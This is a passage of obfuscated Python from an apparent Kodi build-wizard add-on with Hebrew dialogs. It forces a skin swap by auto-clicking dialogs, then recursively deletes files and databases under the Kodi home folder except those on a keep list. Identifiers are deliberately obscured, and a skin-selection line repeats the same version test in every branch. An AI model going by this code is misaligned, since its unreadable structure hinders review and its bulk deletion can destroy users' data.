	elif install :OO0O00O0OOOOO00OO =1 #line:4433
	else :OO0O00O0OOOOO00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"מדיה סנטר?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4434
	if OO0O00O0OOOOO00OO :#line:4435
		if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.mediacenter.mod','skin.mediacenter.nox','skin.phenomenal','skin.Premium.mod']:#line:4436
			OO00O0O0OOOO00OO0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.mediacenter.mod'if KODIV <17 else 'skin.myconfluence'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.mediacenter.nox'if KODIV <17 else 'skin.Premium.mod'#line:4437
			skinSwitch .swapSkins (OO00O0O0OOOO00OO0 )#line:4440
			O0O0OO0O0000O00OO =0 #line:4441
			xbmc .sleep (1000 )#line:4442
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OO0O0000O00OO <150 :#line:4443
				O0O0OO0O0000O00OO +=1 #line:4444
				xbmc .sleep (1000 )#line:4445
				wiz .ebi ('SendAction(Select)')#line:4446
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4447
				wiz .ebi ('SendClick(11)')#line:4448
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4449
			xbmc .sleep (1000 )#line:4450
		if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.mediacenter.mod','skin.mediacenter.nox','skin.phenomenal','skin.Premium.mod']:#line:4451
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4452
			return #line:4453
		wiz .addonUpdates ('set')#line:4454
		OOO00OO0000O00000 =os .path .abspath (HOME )#line:4455
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4456
		O000OOOOOO0O0O0O0 =sum ([len (O0000O0O00O00000O )for OOOO000000000O00O ,OOOO000OO0OOOO00O ,O0000O0O00O00000O in os .walk (OOO00OO0000O00000 )]);OO00O0OO0OOOO0OOO =0 #line:4457
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4458
		EXCLUDES .append ('My_Builds')#line:4459
		EXCLUDES .append ('archive_cache')#line:4460
		EXCLUDES .append ('script.module.requests')#line:4461
		EXCLUDES .append ('myfav.anon')#line:4462
		if KEEPREPOS =='true':#line:4463
			O00000000OO000O0O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4464
			for O00OO0000OO000000 in O00000000OO000O0O :#line:4465
				OOOOOO00OO0OOOO00 =os .path .split (O00OO0000OO000000 [:-1 ])[1 ]#line:4466
				if not OOOOOO00OO0OOOO00 ==EXCLUDES :#line:4467
					EXCLUDES .append (OOOOOO00OO0OOOO00 )#line:4468
		if KEEPSUPER =='true':#line:4469
			EXCLUDES .append ('plugin.program.super.favourites')#line:4470
		if KEEPMOVIELIST =='true':#line:4471
			EXCLUDES .append ('plugin.video.metalliq')#line:4472
		if KEEPMOVIELIST =='true':#line:4473
			EXCLUDES .append ('plugin.video.mediacenter.wall')#line:4474
		if KEEPADDONS =='true':#line:4475
			EXCLUDES .append ('addons')#line:4476
		if KEEPADDONS =='true':#line:4477
			EXCLUDES .append ('addon_data')#line:4478
		EXCLUDES .append ('plugin.video.elementum')#line:4481
		EXCLUDES .append ('script.elementum.burst')#line:4482
		EXCLUDES .append ('script.elementum.burst-master')#line:4483
		EXCLUDES .append ('plugin.video.quasar')#line:4484
		EXCLUDES .append ('script.quasar.burst')#line:4485
		EXCLUDES .append ('skin.estuary')#line:4486
		if KEEPWHITELIST =='true':#line:4489
			OO0OO0OOO0O0O00O0 =''#line:4490
			O00OOO00000OOO0OO =wiz .whiteList ('read')#line:4491
			if len (O00OOO00000OOO0OO )>0 :#line:4492
				for O00OO0000OO000000 in O00OOO00000OOO0OO :#line:4493
					try :O00O000OOOOO0000O ,OO0OOO00O000OOOO0 ,OO0OO0OOO0OO0O00O =O00OO0000OO000000 #line:4494
					except :pass #line:4495
					if OO0OO0OOO0OO0O00O .startswith ('pvr'):OO0OO0OOO0O0O00O0 =OO0OOO00O000OOOO0 #line:4496
					OOO0OOOO0O000O0OO =dependsList (OO0OO0OOO0OO0O00O )#line:4497
					for OO0O00000OOO00OO0 in OOO0OOOO0O000O0OO :#line:4498
						if not OO0O00000OOO00OO0 in EXCLUDES :#line:4499
							EXCLUDES .append (OO0O00000OOO00OO0 )#line:4500
						OO00O000O00O0O0O0 =dependsList (OO0O00000OOO00OO0 )#line:4501
						for OOO0O0O00000OO00O in OO00O000O00O0O0O0 :#line:4502
							if not OOO0O0O00000OO00O in EXCLUDES :#line:4503
								EXCLUDES .append (OOO0O0O00000OO00O )#line:4504
					if not OO0OO0OOO0OO0O00O in EXCLUDES :#line:4505
						EXCLUDES .append (OO0OO0OOO0OO0O00O )#line:4506
				if not OO0OO0OOO0O0O00O0 =='':wiz .setS ('pvrclient',OO0OO0OOO0OO0O00O )#line:4507
		if wiz .getS ('pvrclient')=='':#line:4508
			for O00OO0000OO000000 in EXCLUDES :#line:4509
				if O00OO0000OO000000 .startswith ('pvr'):#line:4510
					wiz .setS ('pvrclient',O00OO0000OO000000 )#line:4511
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4512
		OOO0OOO000O0OO0OO =wiz .latestDB ('Addons')#line:4513
		for O000O00OOOOO0O00O ,O0000OOO0O000O000 ,OO0OOOO00OO00O00O in os .walk (OOO00OO0000O00000 ,topdown =True ):#line:4514
			O0000OOO0O000O000 [:]=[O00OOO000O00000OO for O00OOO000O00000OO in O0000OOO0O000O000 if O00OOO000O00000OO not in EXCLUDES ]#line:4515
			for O00O000OOOOO0000O in OO0OOOO00OO00O00O :#line:4516
				OO00O0OO0OOOO0OOO +=1 #line:4517
				OO0OO0OOO0OO0O00O =O000O00OOOOO0O00O .replace ('/','\\').split ('\\')#line:4518
				O0O0OO0O0000O00OO =len (OO0OO0OOO0OO0O00O )-1 #line:4520
				if OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4521
				elif O00O000OOOOO0000O =='MyVideos99.db'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4522
				elif O00O000OOOOO0000O =='MyVideos107.db'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4523
				elif O00O000OOOOO0000O =='MyVideos116.db'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4524
				elif O00O000OOOOO0000O =='MyVideos99.db'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4525
				elif O00O000OOOOO0000O =='MyVideos107.db'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4526
				elif O00O000OOOOO0000O =='MyVideos116.db'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4527
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'plugin.video.mediacenter.wall'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4528
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'skin.mediacenter.mod'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4529
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'skin.Premium.mod'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4530
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'skin.mediacenter.nox'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4531
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'skin.phenomenal'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4532
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'plugin.video.metalliq'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4533
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'skin.titan'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4535
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'pvr.iptvsimple'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4536
				elif O00O000OOOOO0000O =='sources.xml'and OO0OO0OOO0OO0O00O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4538
				elif O00O000OOOOO0000O =='quicknav.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4541
				elif O00O000OOOOO0000O =='x1101.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4542
				elif O00O000OOOOO0000O =='b-srtym-b.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4543
				elif O00O000OOOOO0000O =='x1102.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4544
				elif O00O000OOOOO0000O =='b-sdrvt-b.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4545
				elif O00O000OOOOO0000O =='x1112.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4546
				elif O00O000OOOOO0000O =='b-tlvvyzyh-b.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4547
				elif O00O000OOOOO0000O =='x1111.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4548
				elif O00O000OOOOO0000O =='b-tvknyshrly-b.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4549
				elif O00O000OOOOO0000O =='x1110.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4550
				elif O00O000OOOOO0000O =='b-yldym-b.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4551
				elif O00O000OOOOO0000O =='x1114.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4552
				elif O00O000OOOOO0000O =='b-mvzyqh-b.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4553
				elif O00O000OOOOO0000O =='mainmenu.DATA.xml'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4554
				elif O00O000OOOOO0000O =='skin.Premium.mod.properties'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4555
				elif O00O000OOOOO0000O =='favourites.xml'and OO0OO0OOO0OO0O00O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4559
				elif O00O000OOOOO0000O =='guisettings.xml'and OO0OO0OOO0OO0O00O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4561
				elif O00O000OOOOO0000O =='profiles.xml'and OO0OO0OOO0OO0O00O [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4562
				elif O00O000OOOOO0000O =='advancedsettings.xml'and OO0OO0OOO0OO0O00O [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4563
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4564
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'program.apollo'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4565
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4566
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'plugin.video.elementum'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4569
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4570
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4571
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'plugin.video.quasar'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4573
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'program.apollo'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4574
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4575
				elif OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -2 ]=='userdata'and OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO0OO0OOO0OO0O00O [O0O0OO0O0000O00OO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4576
				elif O00O000OOOOO0000O in LOGFILES :wiz .log ("Keep Log File: %s"%O00O000OOOOO0000O ,xbmc .LOGNOTICE )#line:4577
				elif O00O000OOOOO0000O .endswith ('.db'):#line:4578
					try :#line:4579
						if O00O000OOOOO0000O ==OOO0OOO000O0OO0OO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O00O000OOOOO0000O ,KODIV ),xbmc .LOGNOTICE )#line:4580
						else :os .remove (os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ))#line:4581
					except Exception as OO0OO0OO00OOO0O0O :#line:4582
						if not O00O000OOOOO0000O .startswith ('Textures13'):#line:4583
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4584
							wiz .log ("-> %s"%(str (OO0OO0OO00OOO0O0O )),xbmc .LOGNOTICE )#line:4585
							wiz .purgeDb (os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ))#line:4586
				else :#line:4587
					DP .update (int (wiz .percentage (OO00O0OO0OOOO0OOO ,O000OOOOOO0O0O0O0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O000OOOOO0000O ),'')#line:4588
					try :os .remove (os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ))#line:4589
					except Exception as OO0OO0OO00OOO0O0O :#line:4590
						wiz .log ("Error removing %s"%os .path .join (O000O00OOOOO0O00O ,O00O000OOOOO0000O ),xbmc .LOGNOTICE )#line:4591
						wiz .log ("-> / %s"%(str (OO0OO0OO00OOO0O0O )),xbmc .LOGNOTICE )#line:4592
			if DP .iscanceled ():#line:4593
				DP .close ()#line:4594
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4595
				return False #line:4596
		for O000O00OOOOO0O00O ,O0000OOO0O000O000 ,OO0OOOO00OO00O00O in os .walk (OOO00OO0000O00000 ,topdown =True ):#line:4597
			O0000OOO0O000O000 [:]=[OOOOO000OO0O00000 for OOOOO000OO0O00000 in O0000OOO0O000O000 if OOOOO000OO0O00000 not in EXCLUDES ]#line:4598
			for O00O000OOOOO0000O in O0000OOO0O000O000 :#line:4599
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O000OOOOO0000O ),'')#line:4600
			  if O00O000OOOOO0000O not in ["Database","userdata","temp","addons","addon_data"]:#line:4601
			   if not (O00O000OOOOO0000O =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4602
			    if not (O00O000OOOOO0000O =='skin.titan'and KEEPSKIN3 =='true'):#line:4604
			      if not (O00O000OOOOO0000O =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4605
			       if not (O00O000OOOOO0000O =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4606
			        if not (O00O000OOOOO0000O =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4607
			         if not (O00O000OOOOO0000O =='program.apollo'and KEEPINFO =='true'):#line:4608
			          if not (O00O000OOOOO0000O =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4609
			            if not (O00O000OOOOO0000O =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4611
